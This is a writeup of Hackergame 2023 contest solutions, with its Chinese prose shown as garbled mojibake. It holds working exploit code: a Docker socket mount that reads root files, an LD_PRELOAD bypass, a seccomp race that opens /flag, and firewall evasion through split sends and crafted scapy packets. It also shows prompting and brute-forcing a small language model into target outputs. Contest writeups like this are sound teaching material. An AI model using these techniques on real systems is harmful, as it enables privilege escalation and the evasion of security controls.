# Hackergame 2023 Writeup

æœ¬ç¯‡é¢˜è§£çš„è¯¦ç»†ç‰ˆæœ¬ä¹Ÿå°†å‘è¡¨äº [æˆ‘çš„åšå®¢](https://blog.gzti.me) ï¼ˆæš‚ç¼ºï¼‰

## Hackergame å¯åŠ¨

~~å……å€¼ 648 å³å¯è·å¾— flag~~

è¯·æ±‚å‚æ•°åœ¨ url å‚æ•°ä¸­ï¼Œå¯ä»¥æ”¹æˆ `?similarity=114514` ç›´æ¥é€šè¿‡ï¼Œä¹‹åå°±èƒ½æˆåŠŸå¯åŠ¨ ~yuangame2023~ äº†ã€‚

é¢˜å¤–è¯ï¼Œæƒ³å½“å¹´åšé‡å­è—å®å›¾çš„æ—¶å€™è¿˜ä¸çŸ¥é“ä»€ä¹ˆæ˜¯æ—…è¡Œè€…ã€‚
ç°åœ¨å·²ç»æ˜¯ä¸€ä¸ªå¿«è¦ 58 çº§çš„æ—…è¡Œè€…äº†ï¼ˆåˆ’æ‰

**`flag{WElcom3-tO-HaCKeR94ME-@nd-ENjOY-h@cKIng-2Oz3}`**

## çŒ«å’ªå°æµ‹

1. `12`ï¼šæ ¹æ® [ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å›¾ä¹¦é¦†ä¹¦ç›®æ£€ç´¢ç³»ç»Ÿ](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=6c546d744c485a626535313758422f2b7a47426c736b33785a614a66364b5831314a6e4f7a474d595364633d)ï¼Œå°†é¼ æ ‡æ”¾åˆ° **é¦†è—åœ°** çš„å›¾æ ‡ä¸Šï¼Œå¯ä»¥çŸ¥é“åº”å½“åœ¨ 12 å±‚ã€‚

2. `23`ï¼šé˜…è¯»è®ºæ–‡ [Nuggets of Wisdom: Determining an Upper Limit on the Number Density of Chickens in the Universe](https://arxiv.org/pdf/2303.17626.pdf)ï¼Œå¯çŸ¥ç­”æ¡ˆæ˜¯ 23ã€‚

3. `CONFIG_TCP_CONG_BBR`ï¼šæœç´¢å¼•æ“æœç´¢å¯å¾— [Increase Linux Internet speed with TCP BBR congestion control](https://www.cyberciti.biz/cloud-computing/increase-your-linux-server-internet-speed-with-tcp-bbr-congestion-control/)

4. `ECOOP`ï¼šæœç´¢ PL ç›¸å…³é¡¶ä¼šï¼Œåœ¨ [çŸ¥ä¹](https://zhuanlan.zhihu.com/p/45208498) çœ‹åˆ° â€œå›½é™…ä¸Šç¼–ç¨‹è¯­è¨€æœ‰å…¬è®¤çš„å››å¤§é¡¶ä¼šï¼šPLDIã€POPLã€OOPSLAã€ECOOPã€‚â€ï¼Œé€ä¸ªå°è¯•ã€‚

**`flag{weLC0m3-to-aT73nd-TH3-Nek0-ExaM-2OZ3}`**
**`flag{RE4l-ma$73r-of-THE-nEKO-ex4M-!N-u5TC}`**

## æ›´æ·±æ›´æš—

F12 æŸ¥çœ‹ HTMLï¼Œå‘ç°æœ€ä¸‹é¢å­˜åœ¨ flag å­—ç¬¦ä¸²

**`flag{T1t@n_4e3d1ca5eb35f4c1b837e9bb7cbbd72e}`**

## æ—…è¡Œç…§ç‰‡ 3.0

ç”¨ä¸€äº›æ¯”è¾ƒæ„è¯†æµçš„çº¿ç´¢ï¼š

é‡‘è‰²å¥–ç‰Œï¼šè¯ºè´å°”ç‰©ç†å­¦å¥–ï¼Œå°æŸ´æ˜Œä¿Šï¼Œä¸œäº¬å¤§å­¦ï¼Œæ¢¶ç”°éš†ç« ï¼ŒICRR
è„–å­ä¸ŠæŒ‚ç‰Œï¼šStatphys28ï¼ŒAugust 7th-11th, 2023
åšç‰©é¦†ï¼šä¸œäº¬å›½å®¶åšç‰©é¦†ï¼ŒStudents Freeï¼ŒUeno Parkï¼Œ[ä¸œäº¬å…¨å›½æ¢…é…’èŠ‚](https://umeshu-matsuri.jp/tokyostaff/)
Statphys28ï¼šAugust 10thï¼ŒBanquetï¼Œå®‰ç”°è®²å ‚
ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ï¼šç²‰è‰²æµ·æŠ¥ï¼Œç†ŠçŒ«
3D å¹¿å‘Šï¼šæ¯å°æ—¶ï¼Œç§‹ç”°çŠ¬

å¤§æ¦‚å¦‚æ­¤ï¼Ÿæˆ‘çœ‹å…¶ä»–äººçš„ wp éƒ½æ›´è¯¦ç»†ï¼Œè¿™é‡Œé…’ä¸å±•å¼€äº†

**`flag{how_I_wi5h_i_COulD_w1N_A_Nobe1_pri23_ac8a3757d0}`**
**`flag{PluM_w1NE_1S_rEa1LY_EXpen5iVE_d553d0963e}`**
**`flag{Un7I1_W3_M337_A64iN_6oODByE_S3n1OR_1a850a6dab}`**

## èµ›åšäº•å­—æ£‹

å¯¹äºäº•å­—æ£‹ï¼Œå­˜åœ¨åæ‰‹å¿…ä¸è´¥çš„ç­–ç•¥ï¼Œå› æ­¤ç›´æ¥å°è¯•æ˜¯ä¸å¯èƒ½çš„ã€‚
ç»è¿‡å°è¯•å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜ç›®çš„å®ç°å¯ä»¥é‡å¤è¦†ç›–è¿›è¡Œä¸‹æ£‹ï¼Œåªè¦~~ä½œå¼Š~~è¦†ç›–å¯¹æ‰‹çš„æ£‹å­ï¼Œå°±èƒ½éšä¾¿èµ¢ã€‚

**`flag{I_can_eat_your_pieces_468d08ff03}`**

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

ç”±äºæœ‰å»å¹´çš„ä¸€ç³»åˆ—æˆªå›¾å®ç°å¯¼è‡´çš„å®‰å…¨é—®é¢˜å­˜åœ¨ï¼Œæ•…çŒœæµ‹æœ¬é¢˜å¯ä»¥åˆ©ç”¨å·¥å…·è§£ç­”ã€‚

æœç´¢ googleï¼Œæˆªå›¾ï¼ŒCVE ç­‰è¯è¯­åï¼Œå¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ° [acropalypse](https://acropalypse.app/)

é€‰æ‹© `custom` è®¾å¤‡ï¼Œç»“åˆå·²çŸ¥è®¾å¤‡ï¼Œè¾“å…¥ `2048x1080` ä¹‹åå³å¯å¾—åˆ°ç­”æ¡ˆã€‚

**`flag{sh1nj1ru_k0k0r0_4nata_m4h0}`**

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

~~ä¸ä¼šæœ‰äººæ‰‹åŠ¨ç‚¹å§~~

F12 åˆ†ææµé‡å¯ä»¥çŸ¥é“ï¼ŒæœåŠ¡å™¨ç»™å‡ºäº†ä¸€ç³»åˆ—æ—¶é—´æˆ³å’Œä¿¡æ¯ï¼Œç®—å¥½æ—¶é—´å‘é€ `delete` è¯·æ±‚ï¼Œç­‰å¾…ç»“æœå°±å¥½ã€‚

```py
import requests
import re

cookies = {
    'session': '...'
}

s = requests.Session()

r = s.post('http://202.38.93.111:10021/api/getMessages', cookies=cookies)

msg = r.json()

to_read = msg['messages']

import time
import tqdm

pattern = re.compile(r'hack\[(.*)\]')
start = time.time()

for idx, m in tqdm.tqdm(enumerate(to_read)):
    nxt = float(m['delay'])
    if pattern.search(m['text']) is not None:

        while time.time() - start < nxt + 0.4:
            time.sleep(1)

        r = s.post('http://202.38.93.111:10021/api/deleteMessage',
                   cookies=cookies, json={'id': idx})

        if not r.json()['success']:
            print(r.json())
            break

r = s.post('http://202.38.93.111:10021/api/getflag', cookies=cookies)

r.json()
```

**`flag{Web_pr0gra_mm1ng_2d07d5f8fd_15fun}`**

## è™«

SSTV

**`flag{SSssTV_y0u_W4NNa_HaV3_4_trY}`**

## JSON âŠ‚ YAML?

1. æœç´¢å¯ä»¥å¾—åˆ° [What valid JSON files are not valid YAML 1.1 files?](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)

   æ„é€ ç”¨ä¾‹ï¼š`{ "2": 12345e999 }` å³å¯æ»¡è¶³æ¡ä»¶ä¸€

2. ç¿»æ‰¾ `ruamel.yaml` çš„ç›¸å…³å®ç°ä¸­æ‰€æœ‰å¯èƒ½å­˜åœ¨ `raise` çš„ä½ç½®ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€å¤„æœ‰å…³äºé‡å¤é”®å€¼çš„ Exceptionï¼Œä½†æ˜¯åœ¨é—®é¢˜ä¸€çš„å°è¯•ä¸­ï¼Œè¿™ä¸€é—®é¢˜ä¸ä¼šå¼•å‘æŠ¥é”™

   æ„é€ ç”¨ä¾‹ï¼š`{ "2": 12345e999, "2": 12345e999 }` å³å¯æ»¡è¶³æ¡ä»¶äºŒ

**`flag{faf9facd7c9d64f74a4a746468400a50e4bbb0772a}`**
**`flag{b1c73f14d04db546b7e7e24cf1cc725205cc4b3808}`**

## Git? Git!

Git çš„å…¨éƒ¨æ•°æ®å‡å‹ç¼©åå­˜å‚¨åœ¨ `.git/objects` ä¸­ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è§£å‹ç¼©åæœç´¢ flagã€‚

```py
import os
import zlib

path = "./ML-Course-Notes/.git/objects"

for (path, dirs, files) in os.walk(path):
    for file in files:
        name = os.path.join(path, file)
        for ignore in ["info", "pack"]:
            if ignore in name:
                continue

        with open(name, "rb") as f:
            try:
                data = zlib.decompress(f.read())
                if b"flag" in data:
                    print("[+]: " + name)
                    s = data.decode()
                    pos = s.find("flag")
                    print(s[pos:pos+50])
            except:
                print("Error: " + name)
                continue
```

**`flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t}`**

## HTTP é›†é‚®å†Œ

1. ä¸€æ¬¡æ‰‹æ»‘å¤šåˆ é™¤äº†ä¸€ä¸ªç©ºæ ¼åå‡ºç°äº†æœ‰å…³äº HTTP 0.9 çš„æ— çŠ¶æ€ç æŠ¥æ–‡ï¼š

   ```
   GET /HTTP/1.1\r\n
   \r\n
   ```

2. çŠ¶æ€ç æ„é€ ä¸€è§ˆè¡¨ï¼š

   | çŠ¶æ€ç  | è¯·æ±‚                | ç‰¹æ®Š Header                 |
   | :----: | :------------------ | :-------------------------- |
   |  100   | `GET / HTTP/1.1`    | `Expect: 100-continue`      |
   |  200   | `GET / HTTP/1.1`    | &nbsp;                      |
   |  206   | `GET / HTTP/1.1`    | `Range: bytes=0-1`          |
   |  304   | `GET / HTTP/1.1`    | `If-Modified-Since: ...`    |
   |  400   | `GET / HTTP/1.1`    | `Content-Length: -1010101`  |
   |  404   | `GET /404 HTTP/1.1` | &nbsp;                      |
   |  405   | `POST / HTTP/1.1`   | &nbsp;                      |
   |  412   | `GET / HTTP/1.1`    | `If-Match: "*"`             |
   |  413   | `GET / HTTP/1.1`    | `Content-Length: 104000000` |
   |  416   | `GET / HTTP/1.1`    | `Range: bytes=100000000-`   |
   |  501   | `GET / HTTP/1.1`    | `Transfer-Encoding: gzip`   |
   |  505   | `GET / HTTP/2`      | &nbsp;                      |

**`flag{stacking_up_http_status_codes_is_fun_7ef5b51ff4}`**
**`flag{congratu1ations you discovered someth1ng before http1.0}`**
**`flag{I think that when many such status codes are accumulated eeb164fb06 it becomes a lifetime}`**

## Docker for Everyone

Docker æ˜¯åŒºåˆ†å‰åç«¯çš„è¿›ç¨‹ï¼Œä½¿ç”¨ `docker` å‘½ä»¤æ˜¯å‘ `socket` å‘é€è¯·æ±‚ï¼Œå®é™…çš„æ‰§è¡Œå’Œæ–‡ä»¶è®¿é—®æƒé™ä¸º daemon çš„æ‰€æœ‰è€…ï¼Œæœ¬é“é¢˜ä¸­ä¹Ÿå°±æ˜¯ rootï¼Œå› æ­¤å¯ä»¥é€šè¿‡æŒ‚è½½çš„æ–¹å¼è¯»å– flagã€‚

```sh
alpine:~$ docker run -it --rm -v /dev/shm/flag:/flag alpine sh
/ # ls
bin    etc    home   media  opt    root   sbin   sys    usr
dev    flag   lib    mnt    proc   run    srv    tmp    var
/ # cat flag
flag{u5e_r00t1ess_conta1ner_98d15a166b_plz!}
```

**`flag{u5e_r00t1ess_conta1ner_98d15a166b_plz!}`**

## æƒœå­—å¦‚é‡‘ 2.0

æ¯”å»å¹´è¦åˆ©ç”¨ coppersmith è§£å¯†çš„ç®€å•å¤šäº†ã€‚

ç”±äºäº”è¡Œéƒ½åªæœ‰ä¸€ä¸ªå­—æ¯ç¼ºå¤±ï¼Œå¯ä»¥å°è¯•æ‰‹åŠ¨è§£é¢˜ï¼Œæ‰¾åˆ°è¿™ä¸ªå¾ˆåƒæ˜¯ç­”æ¡ˆçš„è§£.jpg

```py
codes = [
    'nymeh1niwemflcir}echaet@',
    'a3g7}kidgojernoetlsup?h@',
    'ullw!f5soadrhwnrsnstnoeq', # f ä¹‹å‰è¡¥å……ä¸€ä¸ª
    'ctt{l-findiehaai{oveatas', # { ä¹‹å‰è¡¥å……ä¸€ä¸ª
    'tty9kxborszstguyd?!blm-p'  # g ä¹‹å‰è¡¥å……ä¸€ä¸ª
]

flag_seq = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]

result = []
cmap = []

for i in flag_seq:
    code = codes[i // 24]
    cmap.append(i // 24)
    result.append(code[i % 24])

print(cmap)
print(str(result).replace("'", ''))

"".join(result)
```

**`flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}`**

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

å¤§æ¦‚è¯»æ‡‚æ–‡ä»¶å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°†å‡ºç°çš„å› ä¸º `less` å­˜åœ¨æ§åˆ¶å­—ç¬¦åºåˆ—å…¨éƒ¨æ›¿æ¢åˆ é™¤ï¼Œæ¢å¤åŸæ–‡ä»¶ã€‚

ç¨‹åºè¿è¡Œæ—¶çš„ `asciinema_restore.rec` å·²ç»å»é™¤äº† `less` ä¹‹å‰çš„å†…å®¹ã€‚

```py
import os
import json

file = "./asciinema_restore.rec"

with open(file, "rb") as f:
    data = f.read()

data = data.split(b"\n")
res = []

syms = [
    b':\x1b[K',
    b'~\x1b[K',
    b'\r\x1b[K \x1b[KESC\x08\x08\x08ESC',
    b'\r\x1b[K',
    b'\x1b[7mflag.js\x1b[27m\x1b[K',
    b'\x1b[K[\x08[',
    b'\x1b[K~\x08~',
    b'\x1b[K6\x086',
    b'\x1b[7m(END)'
    b'\x1b[27m\x1b[K'
]

for line in data:
    try:
        ret = json.loads(line)
        ret = ret[2].encode()

        if b"\r\x1b[K \x1b[KESC\x08\x08" in ret and len(ret) <= 39:
            continue

        for i in syms:
            ret = ret.replace(i, b"")

        res.append(ret)
    except:
        pass

with open("res.js", "wb") as f:
    f.write(b"".join(res))

os.system("node res.js")
```

**`flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}`**

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ

ä»ç¬¬ä¸‰é¢˜å¼€å§‹ï¼Œåˆ†æå¯ä»¥çŸ¥é“è¦åœ¨ç»™å®šäº†è¾“å‡ºåºåˆ—çš„æƒ…å†µä¸‹è®­ç»ƒè¾“å…¥å‘é‡ï¼Œéœ€è¦è¿›è¡Œä¸€äº›æ¨¡å‹çš„ hackï¼Œæ—¶é—´åŸå› æ²¡ç»§ç»­åšã€‚

1. ç¬¬ä¸€é—®ï¼Œè®²é“ç†ï¼š

    ```
    this story is about "you are smart", the boy's name is "you are smart", the girl called him:


    "you are smart".

    The boy was so happy to hear the story. He thanked the girl and said: "I will always remember this
    ğŸ‘ğŸ‘ğŸ‘ flag1: flag{1-THINK-y0u-4Re-Re411y-RE@LLy-$Mart} ğŸ‘ğŸ‘ğŸ‘
    ```

2. æš´åŠ›ï¼Œåœ¨æœ¬åœ°è¿è¡Œèµ·æ¨¡å‹ä¹‹åï¼Œå¯¹äºå°‘äº 7 ä¸ªå­—ç¬¦çš„è¾“å…¥è¿›è¡Œæšä¸¾ï¼Œå¾ˆå¿«å¯ä»¥å¾—åˆ°ï¼š

    ```
    d}


    accepted and gave him the gift.

    The man was so happy and he thanked the shopkeeper. He went home and enjoyed his new gift.
    ğŸ‰ğŸ‰ğŸ‰ flag2: flag{y0u-4re-4CCepTED-T0-CoN7INUE-THe-G@Me} ğŸ‰ğŸ‰ğŸ‰
    ```

**`flag{1-THINK-y0u-4Re-Re411y-RE@LLy-$Mart}`**
**`flag{y0u-4re-4CCepTED-T0-CoN7INUE-THe-G@Me}`**

## ğŸª æµå¼æ˜Ÿçƒ

~~MyGo ä¸‹è½½å¥½äº†ä¸€ç›´æ²¡çœ‹å‘œå‘œå‘œ~~

åœ¨ `ipynb` ä¸­ä¸€æ­¥ä¸€æ­¥å°è¯•æ±‚è§£ã€‚é¦–å…ˆå¯¹äºå¯èƒ½çš„é•¿åº¦è¿›è¡Œå› å¼åˆ†è§£ï¼š

```py
import cv2
import numpy as np
from tqdm import tqdm
from itertools import combinations
import itertools
import math
from PIL import Image

length = 0
buffer = None
with open('./video.bin', 'rb') as f:
    buffer = np.fromfile(f, dtype=np.uint8)
    buffer = buffer.reshape(-1, 3)
    length = buffer.shape[0]

def prime_factor(num):
    original_num = num
    factors = []
    for i in range(2, int(math.sqrt(num)) + 1):
        while num % i == 0:
            factors.append(i)
            num //= i

    if num > 1:
        factors.append(num)

    result = np.prod(factors)

    if result != original_num:
        raise Exception('not prime factor: {}'.format(original_num))

    return factors


possible_factors = {}

# try to factorize the length
for i in range(100):
    fs = prime_factor(length + i)

    # must have at least 4 factors
    if len(fs) <= 3: continue

    possible_factors[length + i] = fs

def extract(real_len, width, height=998, write=True):
    img = buffer[:width * height].reshape((height, width, 3))
    print(img.shape)
    if write:
        cv2.imwrite(f'./img/{real_len}_{width}_{height}.png', img)
    else:
        return Image.fromarray(img)


def test():
    # take the first frame of the video in every possible factor
    # need to combine the factors to get the resolution
    for real_len in possible_factors.keys():
        fs = possible_factors[real_len]

        for count in range(1, len(fs)):
            for item in combinations(fs, count):
                width = np.prod(item)
                if width % 10 == 0 or width < 100 or width > 3000:
                    continue
                extract(real_len, width)

```

å°è¯•æå–ä¸€äº›åï¼Œæ ¹æ®è¾“å‡ºå¯¹å®½åº¦è¿›è¡Œå¢å‡æµ‹è¯•ï¼ŒäºŒåˆ†å¯ä»¥å¿«é€Ÿå¾—åˆ°å¦‚ä¸‹å¸¸é‡ï¼š

```py
frame_width = 427
frame_height = 759
file_len = 0
frame_size = frame_width * frame_height
frame_count = length // frame_size

for real_len in possible_factors.keys():
    if real_len % frame_width != 0 or real_len % frame_height != 0:
        continue

    print(real_len)
    file_len = real_len

file_len - length
```

ä¹‹åæå–ï¼š

```py
size = (frame_width, frame_height)

for i in range(frame_count):
    img = buffer[i * frame_size:(i + 1) * frame_size].reshape(
        (frame_height, frame_width, 3))
    cv2.imwrite(f'./img/{i}.png', img)
```

å¯ä»¥åœ¨å›¾ç‰‡ä¸­æ‰¾åˆ° flag å†…å®¹ã€‚

**`flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}`**

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ

1. ç›´æ¥åœ¨çº¿å‹ç¼©éƒ½èƒ½å¾—åˆ°

2. ç¬¬äºŒé—®çš„å°è¯•ä¸­ç›®å‰å¾—åˆ°çš„æœ€å¥½ç¨‹åº¦æ˜¯æ‰‹åŠ¨ç»˜åˆ¶çŸ¢é‡å›¾ã€å¯¼å‡ºä¸º `webp`ï¼Œå¯ä»¥å¾—åˆ° `160B` çš„æˆç»©ï¼Œæ­¤é¢˜æ­£ç¡®è§£æ³•è¯·å‚è€ƒå…¶ä»– writeup

**`flag{justfind_an_image_compressor_andgo!}`**

## Komm, sÃ¼sser Flagge

### æˆ‘çš„ POST

æƒ³è¦æŠµæŠ— `--algo bm --string "POST"` åªéœ€è¦å°†ä¸€ä¸ª HTTP è¯·æ±‚åˆ†å—å‘é€ï¼Œä½¿å¾—æ— æ³•å¯¹ `POST` è¿›è¡Œå…¨æ–‡åŒ¹é…å³å¯ã€‚

```py
http_request = [
    " / HTTP/1.1",
    "Host: {}:{}".format(addr, port),
    "Content-Length: 100",
    "Content-Type: application/x-www-form-urlencoded",
    "",
    token
]

req = "\r\n".join(http_request)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, int(port)))

s.send(b"PO")
s.send(b"ST")

s.send(req.encode())

print(s.recv(1024).decode())
```

**`flag{ea5Y_sPl1tt3r_45dcf31181}`**

### æˆ‘çš„ P

è¿™ä¸€é—®æˆåŠŸ Get äº†éé¢„æœŸï¼Œå¯¹äº `-m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50"t`ï¼Œç”±äºä¼šè¯»å– 4byteï¼Œäºæ˜¯ç¬¬ä¸€é—®çš„è§£ç­”å¯ä»¥ç»§ç»­ä½¿ç”¨ã€‚

### æˆ‘çš„ GET

å¯¹äºå¦‚ä¸‹çš„è§„åˆ™è¿›è¡Œè€ƒé‡ï¼š

`-m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT`

ä¸æ­¢æ˜¯ TCP åŒ…ï¼Œå…¨éƒ¨æµé‡åŒ…çš„å‰ 50bytes ä¸­å‡éœ€è¦å­˜åœ¨ `GET / HTTP` å­—ç¬¦ä¸²ã€‚æœ€å¼€å§‹è€ƒè™‘ä½¿ç”¨å›ºå®šå€¼ä¹‹é—´çš„ç©ºéš™æ¥å­˜æ”¾ï¼Œåç»­ç»è¿‡æœ¬åœ°çš„æŠ“åŒ…è®¡ç®—ï¼Œç©ºé—´ä¸è¶³ï¼Œå¦‚æœæ”¾åœ¨ TCP Options ä¸­ä¹Ÿå¯èƒ½å¯¼è‡´è¶…å‡º 50bytes çš„èŒƒå›´ã€‚

äºæ˜¯è€ƒè™‘å‘ IP å±‚æ·»åŠ ä¿¡æ¯ï¼Œ~~è¿™é“é¢˜å¡ä½ä¸»è¦æ˜¯å› ä¸ºä¸çŸ¥é“ scapy~~ï¼Œåç»­çŸ¥é“äº†åï¼Œå¾ˆå¿«å°±æˆåŠŸå®ç°ã€‚

åˆä¸€ä¸ªå‘æ˜¯æ“ä½œç³»ç»Ÿå¯èƒ½ä¼šæŠ¢ç­” TCP åŒ…ï¼Œåœ¨å®ƒæ²¡æœ‰ç»´æŠ¤è¿™ä¸ª socket çš„æ—¶å€™ï¼Œä¼šå°è¯• RSTï¼Œå¹²æ‰°æˆ‘ä»¬çš„è¯·æ±‚ã€‚å› æ­¤éœ€è¦ä½¿ç”¨æœ¬åœ° `iptables` è¿›è¡Œ `drop`ã€‚

```bash
sudo iptables -A INPUT -p tcp -s "192.168.23.1" --sport 18082 -j DROP
```

```py
from scapy.all import *

token = ""

ip = IP(
    dst="192.168.23.1",
    options=bytes([15, 12]) + b"GET / HTTP"
)

sport, dport = 61451, 18082

http_request = [
    "POST / HTTP/1.1",
    "Host: 192.168.23.1:18082",
    "Content-Length: 100",
    "Content-Type: application/x-www-form-urlencoded",
    "",
    token
]

data = "\r\n".join(http_request).encode()

seq = RandInt()

SYN = TCP(sport=sport, dport=dport, flags='S', seq=seq)

SYNACK = sr1(ip / SYN)
print(f"[+] SYNACK: seq={SYNACK.seq} ack={SYNACK.ack}")

ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)

send(ip / ACK)
print(f"[+] ACK sent: seq={ACK.seq} ack={ACK.ack}")

DATA = TCP(sport=sport, dport=dport, flags='PA', seq=SYNACK.ack, ack=SYNACK.seq + 1) / data
DATAACK = sr1(ip / DATA)

print(f"[+] DATAACK: seq={DATAACK.seq} ack={DATAACK.ack}")
```

åœ¨å‘é€è¯·æ±‚åŒ…çš„åŒæ—¶ï¼Œç»™ OpenVPN çš„è™šæ‹Ÿç½‘å¡æŒ‚ä¸Š wiresharkï¼Œå°±èƒ½è·å–åˆ°å›å¤äº†ã€‚

å½“é‡åˆ°æµé‡ä¸ç¬¦åˆé¢„æœŸçš„æ—¶å€™æœ€å¥½çš„åŠæ³•æ˜¯é‡å¯ OpenVPNï¼Œ~~åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„å’Œå¡äº†å¤šä¹…~~ã€‚

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

### LD_PRELOAD, love!

`LD_PRELOAD` æ˜¯ Linux ä¸‹çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ç”¨æ¥æŒ‡å®šåŠ¨æ€é“¾æ¥åº“çš„åŠ è½½è·¯å¾„ï¼Œå¯ä»¥ç”¨æ¥åŠ«æŒå‡½æ•°è°ƒç”¨ã€‚

å› æ­¤æˆ‘ä»¬åªéœ€è¦æ­£ç¡®åŠ è½½åŸæœ‰çš„ `libc.so.6` ä¸­çš„å‡½æ•°è¿›è¡Œä½¿ç”¨å³å¯ã€‚

```c
static FILE *(*real_real_fopen)(const char *restrict, const char *restrict) = NULL;

int main() {
    void *handle = dlopen("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
    real_real_fopen = dlsym(handle, "fopen");

    printf("ptr: %p\n", real_real_fopen);
    printf("pid: %d\n", getpid());

    // open flag and read
    FILE *fp = real_real_fopen("/flag", "r");

    char buf[0x100];
    fread(buf, 1, 0x100, fp);
    printf("%s\n", buf);

    return 0;
}
```

### éƒ½æ˜¯ seccomp çš„é”™

æœ¬æ¥æ²¡ä»€ä¹ˆæ€è·¯ï¼Œæ°´ç¾¤æ—¶å€™çœ‹åˆ°æœ‰äººå‘äº†ä¸€ä¸ªæˆªå›¾ï¼Œå†…å®¹æ˜¯æ¥è‡ª Rust çš„ OS Errorï¼Œè¿™ä¸€æˆªå›¾è®©æˆ‘ç¡®ä¿¡äº†å¤šçº¿ç¨‹åœ¨æœ¬é¢˜ä¸­æ˜¯å¯è¡Œçš„ã€‚

å› ä¸ºåœ¨ `open` ç³»ç»Ÿè°ƒç”¨ä¸­ä¼ é€’çš„ä¸ºå­—ç¬¦ä¸²æŒ‡é’ˆï¼Œå› æ­¤åœ¨ `seccomp` ä¸­è¿›è¡Œ syscall æ•°æ®æ‹·è´çš„æ—¶å€™ä¸ä¼šæ‹·è´åˆ°å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œè€Œæ˜¯æŒ‡é’ˆçš„å€¼ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¤šçº¿ç¨‹çš„æ–¹å¼æ¥ç»•è¿‡ `seccomp` çš„é™åˆ¶ï¼Œè¿›è¡Œæ¡ä»¶ç«äº‰ã€‚

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

void write_mem(char* addr, const char* str) {
    while (*str) {
        *addr = *str;
        addr++;
        str++;
    }
    *addr = '\0';
}

const char* temp = "/etc/passwd";
const char* flag = "/flag";

int main()
{
    // create shared memory with mmap
    char *shared_memory = mmap(NULL, 512, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);

    write_mem(shared_memory, temp);

    int child_count = 0;

    while (child_count < 10)
    {
        // fork
        int pid = fork();
        if (pid == -1)
        {
            perror("fork");
            exit(1);
        }

        if (pid == 0)
        {
            for(int i = 0; i < 10000; i++)
            {
                write_mem(shared_memory, flag);
                // sleep for a while
                for (int j = 0; j < 100; j++)
                {
                    asm("nop");
                }

                write_mem(shared_memory, temp);
                // sleep for a while
                for (int j = 0; j < 100; j++)
                {
                    asm("nop");
                }
            }

            exit(0);
        }
        else
        {
            child_count++;
        }
    }

    // print the flag
    for (int i = 0; i < 10000; i++)
    {
        FILE *fp = fopen(shared_memory, "r");
        if (fp == NULL)
        {
            perror("fopen");
            continue;
        }

        char buf[512];
        fread(buf, 1, 512, fp);
        if (buf[0] == 'f')
        {
            printf("flag: %s\n", buf);
            exit(0);
        }
        fclose(fp);
    }

    return 0;
}
```

**`flag{rEAd_seccomp_unotify(2)_mAnpAgE_7e49dc2ad3_t0ct0u}`**

## å¼‚æ˜Ÿæ­§é€”

æ‰“å¼€æ¸¸æˆï¼ŒæŠŠç©ä¸€ä¼šï¼Œå¯ä»¥åœ¨å³ä¸‹è§’çœ‹åˆ°æœ¬æ¸¸æˆæ”¯æŒâ€œé€»è¾‘å¤„ç†å™¨â€è¿™ç§ä¸œè¥¿ã€‚

**ç¬¬ä¸€éƒ¨åˆ†ï¼š**

```log
sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 0 0 0
end
control enabled generator1 0 0 0 0
end
```

ç›´æ¥å¯ä»¥è¯»å‡ºæ¥ï¼š`01011010`

**ç¬¬äºŒéƒ¨åˆ†ï¼š**

```log
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
